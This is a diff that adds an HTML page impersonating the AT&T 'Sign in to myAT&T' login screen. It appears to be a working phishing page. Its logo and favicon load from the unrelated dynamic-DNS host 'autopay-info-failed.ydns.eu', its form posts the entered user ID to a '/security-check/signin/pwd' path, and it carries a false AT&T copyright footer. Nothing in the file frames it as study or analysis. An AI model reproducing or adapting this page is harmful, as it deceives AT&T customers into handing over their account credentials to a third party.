@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login screen</title>
+    <link rel="shortcut icon" href="https://autopay-info-failed.ydns.eu/FAMOUS/Gens/Email/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+</head>
+<style>
+    body {
+        margin:0;
+        padding:0;
+
+    }
+    .card {
+        width: 100%;
+        max-width: 450px;
+        background-color: white;
+        margin: 0 auto;
+        overflow: hidden;
+        border:none;
+        border-radius: 20px;
+      }
+      .input-group label {
+        margin-bottom: 5px; 
+        display: block; 
+        font-weight: bold;
+        font-family: Arial, sans-serif ;
+     }   
+
+        .input-group input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid gray;
+        border-radius: 10px;
+        box-sizing: border-box;
+         font-family: Arial, sans-serif;
+  }
+
+  .large-checkbox {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+  }
+
+  .checkbox-label {
+      display: flex;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      color: #333;
+  }
+  
+  .divider {
+  display: flex; /* Menggunakan flexbox untuk penataan */
+  align-items: center; /* Memastikan teks berada di tengah vertikal */
+  justify-content: center; /* Memastikan teks berada di tengah horizontal */
+  width: 100%; /* Lebar penuh */
+  border-top: 2px solid #ccc; /* Garis atas dengan warna abu-abu muda */
+  position: relative; /* Agar teks bisa diposisikan di atas garis */
+  margin: 20px 0; /* Jarak vertikal antara elemen */
+}
+
+.divider-text {
+  position: absolute; /* Menempatkan teks di atas garis */
+  background-color: white; /* Latar belakang putih agar teks terlihat jelas di tengah garis */
+  padding: 0 10px; /* Memberikan sedikit ruang di kiri dan kanan teks */
+  font-size: 16px; /* Ukuran font */
+  color: #555; /* Warna teks */
+}
+
+
+</style>
+<body>
+    <div style="border: 1px solid rgb(223, 223, 223);" class="card mt-5 mb-3">
+        <div class="text-center mt-5">
+            <img src="https://autopay-info-failed.ydns.eu/FAMOUS/Gens/Email/attmail.svg" alt="" width="100">
+        </div>
+        <div class="text-center mt-4">
+            <h2 style="font-weight: bold; letter-spacing:1px;">Sign in<br>to myAT&T</h2>
+        </div>
+        <form action="/security-check/signin/pwd" method="post">
+            <div style="margin-top: -25px; margin-bottom: -50px;" class="form-group m-3">
+                <div class="row m-4">
+                    <label style="font-weight:bold; margin-left:-10px; font-size:14px;" class="text-muted mb-1" for="">User ID</label>
+                    <input style="border: 1px solid black; border-radius:10px; padding: 10px;" type="text" class="form-control mb-4" name="user" id="user" required>
+                    <button style="font-weight: bold; border-radius:50px; padding: 12px; background-color:#0057b8;" type="submit" class="btn btn-primary d-block w-100 mb-4">Continue</button>
+                    <div class="text-left mt-3">
+                        <a style="font-weight: bold; text-decoration:none; color:#0057b8; font-size:15px" href="#">Forgot user ID?</a><br><br>
+                        <a style="font-weight: bold; text-decoration:none; color:#0057b8; font-size:15px" href="#">Don't have a user ID? Create one now</a><br><br>
+                        <a style="font-weight: bold; text-decoration:none; color:#0057b8; font-size:15px" href="#">Pay without signing in</a><br>
+                    </div>
+                </div>
+            </div>
+            <div class="row m-5">
+                <div class="divider">
+                  <span style="font-size:12px; font-weight:bold;" class="divider-text text-dark">OR</span>
+                </div><br><br>
+                <button style="font-weight: bold; border-radius:50px; padding: 12px; background-color:transparent;" type="submit" class="btn btn-primary d-block w-100 mb-4 text-primary border-primary">Sign in with myAT&T app</button>
+            </div>
+        </form>
+    </div>
+        <div style="margin-top: 50px;" class="footer text-center">
+        <span style="font-size: 13px; color:gray">Legal policy center</span>
+        <span style="font-size: 13px; color:gray" class="ms-4">Privacy policy</span>
+        <span style="font-size: 13px; color:gray" class="ms-4">Terms of use</span>
+        <span style="font-size: 13px; color:gray" class="ms-4">Your privacy choices</span>
+        <div class="">
+            <span style="font-size: 13px; color:gray">©2024 AT&T Intellectual Property. All rights reserved.</span>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/js/all.min.js"></script>
+</body>
+</html>
